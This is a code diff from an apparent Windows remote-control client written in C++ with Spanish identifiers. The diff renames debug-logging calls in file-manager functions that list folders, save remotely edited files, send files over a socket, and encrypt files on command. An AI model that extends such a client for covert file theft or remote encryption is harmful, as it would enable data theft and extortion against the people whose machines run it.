@@ -89,7 +89,7 @@ std::vector<std::string> vDir(c_char* cPath) {
 	hFind = FindFirstFileA(szDir, &win32Archivo);
 
 	if (!hFind) {
-		DebugPrint("No se pudo listar el directorio " + std::string(szDir));
+		__DBG_("No se pudo listar el directorio " + std::string(szDir));
 		return vcFolders;
 	}
 	do {
@@ -162,8 +162,8 @@ void BorrarArchivo(c_char* cPath) {
 void RenombrarArchivo(c_char* cPath, c_char* cNuevoNombre) {
 	if (!MoveFile(static_cast<LPCSTR>(cPath), static_cast<LPCSTR>(cNuevoNombre))) {
 		error();
-		DebugPrint("Error renombrando archivo");
-		DebugPrint(std::string(cPath) + "|" + std::string(cNuevoNombre));
+		__DBG_("Error renombrando archivo");
+		__DBG_(std::string(cPath) + "|" + std::string(cNuevoNombre));
 	}
 }
 
@@ -172,18 +172,18 @@ void BorrarFolder(c_char* cPath) {
 }
 
 void EditarArchivo_Guardar(const std::string strPath, c_char* cBuffer, std::streamsize iBufferSize) {
-	DebugPrint("[!] Guardando archivo [remote-edit]: " + strPath);
+	__DBG_("[!] Guardando archivo [remote-edit]: " + strPath);
 	
 	std::ofstream localFile(strPath, std::ios::binary);
 	if (!localFile.is_open()) {
-		DebugPrint("No se pudo abrir el archivo " + strPath);
+		__DBG_("No se pudo abrir el archivo " + strPath);
 		return;
 	}
 
 	localFile.write(cBuffer, iBufferSize);
 
 	size_t iFinal = localFile.tellp();
-	DebugPrint("[!] " + std::to_string(iFinal) + " escritos");
+	__DBG_("[!] " + std::to_string(iFinal) + " escritos");
 
 
 	localFile.flush();
@@ -192,11 +192,11 @@ void EditarArchivo_Guardar(const std::string strPath, c_char* cBuffer, std::stre
 }
 
 void EnviarArchivo(const std::string& cPath, const std::string& cID, bool isEdit) {
-	DebugPrint("[ID-" + cID + "]Enviando " + cPath);
+	__DBG_("[ID-" + cID + "]Enviando " + cPath);
 	
 	std::ifstream localFile(cPath, std::ios::binary);
 	if (!localFile.is_open()) {
-		DebugPrint("No se pudo abrir el archivo " + cPath);
+		__DBG_("No se pudo abrir el archivo " + cPath);
 		return;
 	}
 
@@ -222,7 +222,7 @@ void EnviarArchivo(const std::string& cPath, const std::string& cID, bool isEdit
 
 	std::vector<char> nSendBuffer(CHUNK_FILE_TRANSFER_SIZE + iHeaderSize);
 	if (nSendBuffer.size() == 0) {
-		DebugPrint("[FM]No se pudo reservar memoria para enviar el archivo - 2");
+		__DBG_("[FM]No se pudo reservar memoria para enviar el archivo - 2");
 		return;
 	}
 
@@ -274,8 +274,7 @@ void Crypt_Archivo(const std::string strPath, const char cCryptOption, const cha
 
 	std::ifstream archivo(strPath, std::ios::binary);
 	if (!archivo.is_open()) {
-		DebugPrint("[CRYPT] ERR IN " + strPass);
-		//cCliente->cSend(cCliente->sckSocket, strComando.c_str(), strComando.size(), 0, false, nullptr);
+		__DBG_("[CRYPT] ERR IN " + strPass);
 		cCliente->cChunkSend(cCliente->sckSocket, "1", 1, 0, true, nullptr, EnumComandos::FM_Crypt_Confirm);
 		return;
 	}
@@ -302,7 +301,7 @@ void Crypt_Archivo(const std::string strPath, const char cCryptOption, const cha
 		archivo_out.close();
 		strComando = "3";
 	}else {
-		DebugPrint("[CRYPT] ERR OUT " + strOut);
+		__DBG_("[CRYPT] ERR OUT " + strOut);
 		strComando = "2";
 	}
 
